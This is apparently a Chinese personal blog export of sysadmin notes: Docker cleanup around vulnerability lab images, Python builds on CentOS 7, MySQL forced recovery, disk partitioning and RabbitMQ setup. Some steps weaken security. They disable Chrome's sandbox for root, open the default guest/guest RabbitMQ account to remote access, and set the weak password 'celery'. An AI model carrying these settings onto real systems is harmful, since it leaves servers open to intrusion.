<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &quot;docker rm 容器id&quot;来删除一个终止状态的容器；若要删除一个运行中的容器，需要加-f参数。</span></span><br><span class="line">root@Linx:~/apache<span class="comment"># docker rm e6318265a202</span></span><br><span class="line">e6318265a202</span><br></pre></td></tr></table></figure>

<h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像:"></a>删除镜像:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看已有的docker镜像</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              47b19964fb50        3 weeks ago         88.1MB</span><br><span class="line">hello-world         latest              fce289e99eb9        8 weeks ago         1.84kB</span><br><span class="line">centos              latest              1e1148e4cc2c        2 months ago        202MB</span><br><span class="line">medicean/vulapps    s_struts2_s2-048    14cac47d977d        19 months ago       348MB</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除images，通过image的id来指定删除谁</span></span><br><span class="line">docker rmi &lt;image <span class="built_in">id</span>&gt;</span><br></pre></td></tr></table></figure>




<hr>
<h1 id="others"><a href="#others" class="headerlink" title="others:"></a>others:</h1><p>这样就可以使用一台机子来专门安装漏洞环境,方便poc测试、调试。</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://github.com/vulhub/vulhub">Pre-Built Vulnerable Environments Based on Docker-Compose</a></li>
<li><a href="https://github.com/Medicean/VulApps">快速搭建各种漏洞环境(Various vulnerability environment</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7下root运行Chrome</title>
    <url>//12733.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在Centos7下安装好Chrome浏览器后,root直接运行Chrome的话,会有提示说</p>
<p><code>Running as root without --no-sandbox is not supported</code></p>
<h1 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h1><p>修改Chrome的启动脚本即可.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /usr/bin/google-chrome</span><br></pre></td></tr></table></figure>

<p>修改前</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># processes (http://crbug.com/376567).</span><br><span class="line">exec &lt; /dev/null</span><br><span class="line">exec &gt; &gt;(exec cat)</span><br><span class="line">exec 2&gt; &gt;(exec cat &gt;&amp;2)</span><br><span class="line"></span><br><span class="line"># Note: exec -a below is a bashism.</span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot;</span><br></pre></td></tr></table></figure>

<p>修改后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># processes (http://crbug.com/376567).</span><br><span class="line">exec &lt; /dev/null</span><br><span class="line">exec &gt; &gt;(exec cat)</span><br><span class="line">exec 2&gt; &gt;(exec cat &gt;&amp;2)</span><br><span class="line"></span><br><span class="line"># Note: exec -a below is a bashism.</span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; --no-sandbox --user-data-dir</span><br></pre></td></tr></table></figure>

<p>这个时候就可以用chrome</p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://www.itzgeek.com/how-tos/linux/centos-how-tos/how-to-run-google-chrome-as-root-centos-7-rhel-7.html">How to run Google Chrome as root on CentOS 7 &#x2F; RHEL 7</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7安装py环境</title>
    <url>//34580.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>环境: Centos7 64位</p>
<hr>
<h1 id="安装py3"><a href="#安装py3" class="headerlink" title="安装py3:"></a>安装py3:</h1><p>py3版本:<code>3.6.3</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 准备编译环境</span></span><br><span class="line">yum install zlib-devel bzip2-devel openssl-devel ncurses-devel -y</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装编译所需依赖</span></span><br><span class="line">yum install gcc-c++ gcc -y</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载 Python3.6代码包</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tar.xz</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar xf Python-3.6.3.tar.xz -C /usr/local/src/</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译安装</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/src/Python-3.6.3/</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make -j 4 &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>安装成功后提示</p>
<p><img src="https://i.loli.net/2019/05/23/5ce5ff3a7ce4393926.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 做软链：</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3.6 /usr/local/bin/python3</span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3.6 /usr/bin/python3    </span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级pip到最新版本：</span></span><br><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure>

<p>搞定.</p>
<hr>
<h1 id="同时再安装py3-9"><a href="#同时再安装py3-9" class="headerlink" title="同时再安装py3.9:"></a>同时再安装py3.9:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载 Python3.9源码包</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tgz</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar xf Python-3.9.5.tgz -C /usr/local/src/</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译安装</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/src/Python-3.9.5/</span><br><span class="line">./configure --prefix=/usr/local/python3.9</span><br><span class="line">make -j 4 &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 做软链：</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3.9/bin/python3 /usr/local/bin/python3.9</span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3.9/bin/python3 /usr/bin/python3.9  </span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/python3.9/bin/pip3 /usr/bin/pip3.9</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级pip到最新版本：</span></span><br><span class="line">pip3.9 install --upgrade pip</span><br></pre></td></tr></table></figure>


<p>注意路径，然后不要把原来的另一个python3版本的覆盖了就好。</p>
<hr>
<h1 id="安装py2"><a href="#安装py2" class="headerlink" title="安装py2:"></a>安装py2:</h1><p>py2版本:<code>2.7.13</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 准备编译环境</span></span><br><span class="line">yum groupinstall <span class="string">&quot;Development tools&quot;</span></span><br><span class="line">yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载&amp;解压</span></span><br><span class="line">wget https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tgz</span><br><span class="line">tar -zxvf Python-2.7.13.tgz</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line"><span class="built_in">cd</span> Python-2.7.13</span><br><span class="line">./configure --prefix=/usr/local</span><br><span class="line">make</span><br><span class="line">make altinstall</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份原有系统默认的py</span></span><br><span class="line"><span class="built_in">mv</span> /usr/bin/python /usr/bin/python.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 软链接:</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/python2.7 /usr/bin/python</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/05/23/5ce61595de84126805.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装pip</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python get-pip.py  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 软链接:</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/pip2.7 /usr/bin/pip</span><br></pre></td></tr></table></figure>

<p>修改yum配置:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改yum文件头部,要指向系统默认的Python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看/usr/bin/目录下所有yum文件头部</span></span><br><span class="line">ll /usr/bin/yum*　　</span><br><span class="line"><span class="comment"># 修改/usr/bin/目录下所有yum文件头部,一般就修改/usr/bin/yum这个</span></span><br><span class="line">vi /usr/bin/yum*　　</span><br><span class="line"><span class="comment">#!/usr/bin/python 修改成: #!/usr/bin/python2.7　　</span></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改urlgrabber-ext-down头部</span></span><br><span class="line">vi /usr/libexec/urlgrabber-ext-down　　</span><br><span class="line"><span class="comment">#!/usr/bin/python 修改成 #!/usr/bin/python2.7</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="包的迁移"><a href="#包的迁移" class="headerlink" title="包的迁移:"></a>包的迁移:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导出</span></span><br><span class="line">pip2 freeze &gt; py2requirements.txt</span><br><span class="line">pip3 freeze &gt; py3requirements.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="comment"># 加aliyun代理</span></span><br><span class="line">pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意:pip会顺序从列表上安装下来,遇到某个有问题的包后,会退出.后面的包不会被安装到.</p>
</blockquote>
<p>一些无法或很难安装的包,可以尝试通过复制来迁移</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到第三包的安装路径</span></span><br><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> sys.path</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python27.zip&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/plat-linux2&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/lib-tk&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/lib-old&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/lib-dynload&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python2.7/site-packages&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h1 id="pip其他使用场景"><a href="#pip其他使用场景" class="headerlink" title="pip其他使用场景:"></a>pip其他使用场景:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip批量安装跳过无法安装的包继续运行</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> requirement; <span class="keyword">do</span> sudo pip3 install <span class="variable">$requirement</span>; <span class="keyword">done</span> &lt; requirement.txt</span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> requirement; <span class="keyword">do</span> sudo pip2 install <span class="variable">$requirement</span> -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mir</span><br><span class="line">rors.aliyun.com; <span class="keyword">done</span> &lt; py2requirements.log</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.cnblogs.com/chillax1314/p/7976839.html">CentOS6.8安装Python3.6.3</a></li>
<li><a href="https://blog.csdn.net/renhanchi/article/details/73496317">【Python】CentOS 6.9 安装Python２.7.13和pip</a></li>
<li><a href="https://www.cnblogs.com/lvjianxun/articles/7530915.html">CentOS7保留默认python版本并安装更新python2和python3两个最新版本（python2和python3共存）</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Mysql无法启动及数据恢复</title>
    <url>//8704.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>Centos7又报io error了.</p>
<p><img src="https://i.loli.net/2019/07/30/5d3fb1f08413459059.png"></p>
<p>然后想着把数据库的数据迁移出来. </p>
<p>用Navicat直接操作的时候,发现一直报连接不了数据库的错误.无法正常使用.</p>
<p>然后上头说尝试恢复下硬盘.</p>
<hr>
<h1 id="修复硬盘"><a href="#修复硬盘" class="headerlink" title="修复硬盘:"></a>修复硬盘:</h1><p>按这个链接<a href="https://www.cnblogs.com/itqingtian/p/10469104.html">Centos 7 LVM xfs文件系统修复</a>尝试了一下,未果.</p>
<p>因为上次是进不去系统才进行了<code>xfs_repair</code>,这次一断电才开机就又正常了.</p>
<p>然后以为机器正常了,可是这个时候mysql的服务起不来了.</p>
<blockquote>
<p>这个时候没有看mysql的状态和log.不好的习惯.</p>
</blockquote>
<p>那只好尝试一下通过文件来迁移数据库<code>Mysql</code>.</p>
<hr>
<h1 id="通过文件迁移数据库"><a href="#通过文件迁移数据库" class="headerlink" title="通过文件迁移数据库:"></a>通过文件迁移数据库:</h1><p>按照<a href="https://www.jianshu.com/p/f36c4f4447e9">【MySQL】MySQL数据库迁移并同步（简单粗暴版）</a> 来传mysql的文件.</p>
<p>里面提到通过用<code>rsync</code>来传文件.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#后面的路径是目标路径</span></span><br><span class="line">rsync -avz /var/lib/mysql 192.168.189.131:/var/lib/mysql</span><br><span class="line"></span><br><span class="line">rsync -avz /var/lib/mysql 192.168.189.131:/var/lib/</span><br></pre></td></tr></table></figure>

<p>具体用的哪条命令,忘了…</p>
<hr>
<h1 id="查看Log"><a href="#查看Log" class="headerlink" title="查看Log"></a>查看Log</h1><p>迁移完数据库文件后,重启数据库服务,依旧起不来.</p>
<p>发现状态一直在<code>activating</code>…</p>
<p>根据<a href="https://www.cnblogs.com/chunzhensuan/p/9178269.html">Centos7 上安装mysql遇上的问题：mysql无法正常启动</a>,去看mysql的log.</p>
<p>才找到了问题所在.</p>
<blockquote>
<p><strong>看Log的重要性!!!</strong></p>
<p><strong>看Log的重要性!!!</strong></p>
<p><strong>看Log的重要性!!!</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InnoDB: Error: trying to access page number 0 in space 168,</span><br><span class="line">InnoDB: space name okcloud/ok_1_ipscan_task_result,</span><br><span class="line">InnoDB: which is outside the tablespace bounds.</span><br><span class="line">InnoDB: Byte offset 0, len 16384, i/o type 10.</span><br><span class="line">InnoDB: If you get this error at mysqld startup, please check that</span><br><span class="line">InnoDB: your my.cnf matches the ibdata files that you have in the</span><br><span class="line">InnoDB: MySQL server.</span><br><span class="line">2019-07-29 19:23:43 7f2a7946d700  InnoDB: Assertion failure in thread 139820400039680 in file fil0fil.cc line 5666</span><br><span class="line">InnoDB: We intentionally generate a memory trap.</span><br><span class="line">InnoDB: Submit a detailed bug report to http://bugs.mysql.com.</span><br><span class="line">InnoDB: If you get repeated assertion failures or crashes, even</span><br><span class="line">InnoDB: immediately after the mysqld startup, there may be</span><br><span class="line">InnoDB: corruption in the InnoDB tablespace. Please refer to</span><br><span class="line">InnoDB: http://dev.mysql.com/doc/refman/5.6/en/forcing-innodb-recovery.html</span><br><span class="line">InnoDB: about forcing recovery.</span><br></pre></td></tr></table></figure>

<p>访问这个表<code>ok_1_ipscan_task_result</code>出错,可参考<code>forcing recovery</code></p>
<hr>
<h1 id="恢复数据"><a href="#恢复数据" class="headerlink" title="恢复数据:"></a>恢复数据:</h1><h2 id="Mysql-Forcing-InnoDB-Recovery特性"><a href="#Mysql-Forcing-InnoDB-Recovery特性" class="headerlink" title="Mysql Forcing InnoDB Recovery特性:"></a>Mysql Forcing InnoDB Recovery特性:</h2><blockquote>
<p>需要做特殊操作，让 MySQL 跳过恢复，启动 MySQL，然后把数据导出来，再重建数据库导入。</p>
<p>MySQL 有个一个特性：<a href="https://dev.mysql.com/doc/refman/5.7/en/forcing-innodb-recovery.html">Forcing InnoDB Recovery</a>，启用这个特性需要设置  </p>
<p>innodb_force_recovery 大于 0。</p>
<p>innodb_force_recovery 可以设置为 1-6，大的值包含前面所有小于它的值的影响。</p>
<ol>
<li><p><code>(SRV_FORCE_IGNORE_CORRUPT)</code>: <strong>忽略检查到的 corrupt 页。尽管检测到了损坏的 page 仍强制服务运行。一般设置为该值即可，然后 dump 出库表进行重建。</strong></p>
</li>
<li><p><code>(SRV_FORCE_NO_BACKGROUND)</code>: 阻止主线程的运行，如主线程需要执行 full purge 操作，会导致 crash。 阻止 master thread 和任何 purge thread 运行。若 crash 发生在 purge 环节则使用该值。</p>
</li>
<li><p><code>(SRV_FORCE_NO_TRX_UNDO)</code>: 不执行事务回滚操作。</p>
</li>
<li><p><code>(SRV_FORCE_NO_IBUF_MERGE)</code>: 不执行插入缓冲的合并操作。如果可能导致崩溃则不要做这些操作。不要进行统计操作。该值可能永久损坏数据文件。若使用了该值，则将来要删除和重建辅助索引。</p>
</li>
<li><p><code>(SRV_FORCE_NO_UNDO_LOG_SCAN)</code>: 不查看重做日志，InnoDB 存储引擎会将未提交的事务视为已提交。此时 InnoDB 甚至把未完成的事务按照提交处理。该值可能永久性的损坏数据文件。</p>
</li>
<li><p><code>(SRV_FORCE_NO_LOG_REDO)</code>: 不执行前滚的操作。恢复时不做 redo log roll-forward。使数据库页处于废止状态，继而可能引起 B 树或者其他数据库结构更多的损坏。</p>
</li>
</ol>
</blockquote>
<p>一般设为1即可,当时没认真看,直接设为了6…</p>
<p>6可能损坏原有数据库表…</p>
<hr>
<h2 id="做法"><a href="#做法" class="headerlink" title="做法:"></a>做法:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my.cnf 中添加：</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">innodb_force_recovery = 1</span><br></pre></td></tr></table></figure>

<p>然后重启数据库,用<code>Navicat</code>将数据库转储成sql语句.</p>
<p>只有在mysql log里报错误的那个表导不出来.不过已经足够了.</p>
<p>恢复了很多的数据.</p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://blog.csdn.net/shushugood/article/details/80226767">ERROR 1874 (HY000): InnoDB is in read only mode.</a></li>
<li><a href="https://www.cnblogs.com/itqingtian/p/10469104.html">Centos 7 LVM xfs文件系统修复</a></li>
<li><a href="https://www.jianshu.com/p/f36c4f4447e9">【MySQL】MySQL数据库迁移并同步（简单粗暴版）</a></li>
<li><a href="https://www.cnblogs.com/chunzhensuan/p/9178269.html">Centos7 上安装mysql遇上的问题：mysql无法正常启动</a></li>
<li><a href="https://www.cnblogs.com/glon/p/6728380.html">利用 Forcing InnoDB Recovery 特性解决 MySQL 重启失败的问题</a></li>
<li><a href="https://blog.csdn.net/shushugood/article/details/80226767">ERROR 1874 (HY000): InnoDB is in read only mode.</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-Centos7系统安装</title>
    <url>//64204.html</url>
    <content><![CDATA[<h1 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装:"></a>系统安装:</h1><h2 id="镜像选择"><a href="#镜像选择" class="headerlink" title="镜像选择:"></a>镜像选择:</h2><p>生产服务器如果是大内存（4G以上内存），建议安装64位版本</p>
<hr>
<h2 id="语言选择"><a href="#语言选择" class="headerlink" title="语言选择"></a>语言选择</h2><p>正式生产服务器建议安装英文版本</p>
<hr>
<h3 id="实际的配置"><a href="#实际的配置" class="headerlink" title="实际的配置:"></a>实际的配置:</h3><p>虚拟机的配置</p>
<ul>
<li>4个cpu</li>
<li>内存为6G</li>
<li>硬盘为200G(精简置备模式)</li>
</ul>
<hr>
<h2 id="自定义硬盘分区"><a href="#自定义硬盘分区" class="headerlink" title="自定义硬盘分区"></a>自定义硬盘分区</h2><p>这个比较重要</p>
<hr>
<h3 id="必要的分区"><a href="#必要的分区" class="headerlink" title="必要的分区:"></a>必要的分区:</h3><p><strong>boot分区</strong>:</p>
<ul>
<li><p>作用：<strong>引导分区</strong>，包含了系统启动的必要内核文件，即使根分区顺坏也能正常引导启动 一般这些文件所占空间在200M以下，</p>
</li>
<li><p>分区建议：分区的时候可选100M-500M之间,如果空间足够用，建议分300-500M。避免由于长期使用的冗余文件塞满这个分区。</p>
</li>
</ul>
<p><strong>&#x2F;分区(根分区):</strong>         </p>
<ul>
<li><p>作用：所有的文件都从这里开始，你可以比喻为Windows的C盘，但其实有区别。如果你有大量的数据在根目录下（比如FTP等）可以划分大一点的空间</p>
</li>
<li><p>分区建议：建议15G以上。看需求，根分区和home分区的大小就类似C盘和D盘的空间分布一样，主要占空间在哪儿就在那里分大容量</p>
</li>
</ul>
<p><strong>swap分区：</strong></p>
<ul>
<li><p>作用：<strong>类似于Windows的虚拟内存</strong>，在内存不够用时占用硬盘的虚拟内存来进行临时数据的存放，而对于linux就是swap分区</p>
</li>
<li><p>分区建议：建议是物理内存大小的2倍，比如你电脑是4G的物理内存，swap分区可以是8G</p>
</li>
</ul>
<blockquote>
<p>朋友的建议:一般的场景就是 内存不到8G 给内存x1.5 或者 2 倍,到8G或以上 给 8-16g就行.</p>
</blockquote>
<hr>
<h3 id="硬盘分区"><a href="#硬盘分区" class="headerlink" title="硬盘分区:"></a>硬盘分区:</h3><p>自定义的硬盘分区:</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e356bd90d.jpg"></p>
<p><del>其中<code>/根目录</code>和<code>swap目录</code>的硬盘类型选择了:<code>Thin provisioning</code>精简配置模式</del></p>
<blockquote>
<p><del>也就是实际上用了多少就分配多少空间,避免浪费空间,免得刚装完,一导出整个虚拟机就很大.</del></p>
</blockquote>
<p><del>在新建虚拟机的时候,已经选择了精简配置模式了,里面的磁盘类型选择默认的即可.</del></p>
<p>不然可能会出现io error这类错误,导致系统崩溃…</p>
<p><img src="https://i.loli.net/2019/06/27/5d143d1d983fd38594.png"></p>
<p>之前在使用centos6的时候,很少出现io error这类错误</p>
<p>查看旧系统cento6的磁盘类型,</p>
<p><img src="https://i.loli.net/2019/07/01/5d19787ac1a6691705.png"></p>
<p>依据这个进行配置.都是选用<code>ext4</code>,而不是默认的<code>xfs</code></p>
<p>配置完成后</p>
<p><img src="https://i.loli.net/2019/07/01/5d197bedc3d7756404.png"></p>
<p>在之后要尽量少直接断电,要正常关机…</p>
<blockquote>
<p>经常断电硬盘早晚完蛋。</p>
</blockquote>
<hr>
<h1 id="虚拟机拷贝"><a href="#虚拟机拷贝" class="headerlink" title="虚拟机拷贝:"></a>虚拟机拷贝:</h1><ol>
<li>浏览数据存储</li>
<li>新建文件夹</li>
<li>copy 后缀为<code>.vmx</code>和<code>.vmdk</code>的文件到 新建的文件夹里</li>
<li>在新的<code>.vmx</code>文件右键:添加资源.</li>
</ol>
<hr>
<h1 id="初始化安装"><a href="#初始化安装" class="headerlink" title="初始化安装:"></a>初始化安装:</h1><ul>
<li><p><a href="https://blog.csdn.net/zwx_lucky/article/details/50116051">centos7没有安装ifconfig命令的解决方法</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/kreo/p/4368811.html">CentOS7安装iptables防火墙</a></p>
</li>
<li><p><a href="https://blog.csdn.net/chenghuikai/article/details/45173909">Centos7下rc.local文件开机不执行…</a></p>
</li>
</ul>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.cnblogs.com/wcwen1990/p/7630545.html">CentOS7安装详解</a></li>
<li><a href="https://www.osyunwei.com/archives/7829.html">CentOS 7.0系统安装配置图解教程</a></li>
<li><a href="https://blog.csdn.net/xiaodage/article/details/83070380">centos7分区建议生产环境</a></li>
<li><a href="https://blog.csdn.net/justlpf/article/details/80703763">linux xfs和ext4的区别</a></li>
<li><a href="https://blog.csdn.net/sinat_29384657/article/details/51152954">CentOS 7 安装教程、硬盘分区、LVM、网络配置、软件源配置、制作</a></li>
<li><a href="https://v2ex.com/t/146662">在经常突然断电的情况下，使用 ext4 和 xfs 哪个文件系统更安全？</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-RabbitMq-Install</title>
    <url>//58684.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p><code>celery</code>+<code>redis</code> 经常会出现重复任务.</p>
<p>所以打算用<code>rabbitmq</code>替换<code>redis</code>.</p>
<hr>
<h1 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装:"></a>下载与安装:</h1><h2 id="erlang"><a href="#erlang" class="headerlink" title="erlang:"></a>erlang:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装erlang</span></span><br><span class="line">yum install erlang -y</span><br></pre></td></tr></table></figure>


<h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq:"></a>rabbitmq:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装RabbitMQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载rpm</span></span><br><span class="line">wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.6.6/rabbitmq-server-3.6.6-1.el7.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install rabbitmq-server-3.6.6-1.el7.noarch.rpm -y</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 完成后启动服务：</span></span><br><span class="line">service rabbitmq-server start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以查看服务状态：</span></span><br><span class="line">service rabbitmq-server status</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 激活开机启动命令</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rabbitmq-server.service</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置:"></a>初始化配置:</h1><h2 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件:"></a>创建配置文件:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/rabbitmq/</span><br><span class="line">vi rabbitmq.config</span><br><span class="line"><span class="comment"># 编辑内容如下：</span></span><br><span class="line">[&#123;rabbit, [&#123;loopback_users, []&#125;]&#125;].</span><br></pre></td></tr></table></figure>

<p>这里的意思是开放使用，rabbitmq默认创建的用户<code>guest</code>，密码也是<code>guest</code>，这个用户默认只能是本机访问，localhost或者127.0.0.1，从外部访问需要添加上面的配置。</p>
<h2 id="用户设置"><a href="#用户设置" class="headerlink" title="用户设置:"></a>用户设置:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">rabbitmqctl add_user celery celery</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加虚拟主机</span></span><br><span class="line">rabbitmqctl add_vhost myvhost</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 赋予用户权限</span></span><br><span class="line">rabbitmqctl set_permissions -p myvhost celery <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
